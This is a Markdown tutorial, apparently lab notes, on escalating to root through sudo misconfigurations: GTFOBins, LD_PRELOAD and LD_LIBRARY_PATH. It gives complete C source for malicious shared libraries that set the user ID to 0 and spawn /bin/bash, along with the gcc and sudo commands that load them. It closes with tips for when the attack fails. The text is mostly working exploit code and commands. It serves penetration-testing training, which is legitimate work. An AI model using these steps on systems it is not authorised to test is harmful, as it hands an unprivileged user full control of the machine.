# SUDO
The sudo command, by default, allows you to run a program with root privileges. Under some conditions, system administrators may need to give regular users some flexibility on their privileges.

Any user can check its current situation related to root privileges using the command:
```
sudo -l
```
Visit GTFOBins (https://gtfobins.github.io) and search for some of the program names. If the program is listed with "sudo" as a function, you can use it to elevate privileges, usually via an escape sequence.
Choose a program from the list and try to gain a root shell, using the instructions from GTFOBins.

## 📌Environment Variables:
Sudo can be configured to inherit certain environment variables from the user's environment.
Check which environment variables are inherited (look for the env_keep options):
```
sudo -l
```
**LD_PRELOAD** and **LD_LIBRARY_PATH** are both inherited from the user's environment. 
- **LD_PRELOAD:** loads a shared object before any others when a program is run.
- **LD_LIBRARY_PATH:** provides a list of directories where shared libraries are searched for first.

### 🔴Exploiting LD_PRELOAD:
LD_PRELOAD is a function that allows any program to use shared libraries. This blog post will give you an idea about the capabilities of LD_PRELOAD. If the "env_keep" option is enabled we can generate a shared library which will be loaded and executed before the program is run. Please note the LD_PRELOAD option will be ignored if the real user ID is different from the effective user ID.
The steps of this privilege escalation vector can be summarized as follows:
1. Check for LD_PRELOAD (with the env_keep option)
2. Write a simple C code compiled as a share object (.so extension) file
3. Run the program with sudo rights and the LD_PRELOAD option pointing to our .so file

The C code will simply spawn a root shell and can be written as follows:
```
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/bash");
}
```

We can save this code as shell.c and compile it using gcc into a shared object file using the following parameters:
```
gcc -fPIC -shared -o shell.so shell.c -nostartfiles
```

We can now use this shared object file when launching any program our user can run with sudo. In our case, Apache2, find, or almost any of the programs we can run with sudo can be used.
We need to run the program by specifying the LD_PRELOAD option, as follows:
```
sudo LD_PRELOAD=/home/user/ldpreload/shell.so find
```
This will result in a shell spawn with root privileges.

### 🔴Exploiting LD_LIBRARY_PATH:
The LD_LIBRARY_PATH variable tells Linux where to look for shared libraries. If sudo allows this variable to be inherited, we can trick a root process into loading a malicious library.

**Step 1: Check Apache2 Dependencies**
```
ldd /usr/sbin/apache2
```
- **ldd** lists all shared libraries used by Apache2.
- Find a commonly used library name (e.g., libcrypt.so.1).

Example output:
```
libcrypt.so.1 => /lib/x86_64-linux-gnu/libcrypt.so.1 (0x00007f8a2d0f7000)
```
This means Apache2 loads **libcrypt.so.1** from the system libraries. We will replace it with a malicious version.

**Step 2: Create a Fake Malicious Library**
```
gcc -o /tmp/libcrypt.so.1 -shared -fPIC /<PATH>/library_path.c
```
- Creates a fake **libcrypt.so.1** in **/tmp**.
- The file contains malicious code that executes a root shell.

Script of library_path.c is:
```
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
        unsetenv("LD_LIBRARY_PATH");
        setresuid(0,0,0);
        system("/bin/bash -p");
}
```
**Step 3: Force Apache2 to Load the Fake Library**
```
sudo LD_LIBRARY_PATH=/tmp apache2
```
- Tells Apache2 to search /tmp first for libraries.
- Since we placed a fake libcrypt.so.1 in /tmp, Apache2 loads our malicious code, giving us root access.
✅ Root shell acquired!

# 🔎 Debugging & Improving the Attack
**What if it doesn't work?**

1️⃣ Try renaming the fake library to another dependency from ldd apache2.
```
mv /tmp/libcrypt.so.1 /tmp/libssl.so.1.1
```
2️⃣ Modify /home/user/tools/sudo/library_path.c to match the function signatures of the original library.

3️⃣ Check if LD_LIBRARY_PATH is truly inherited using sudo -l.
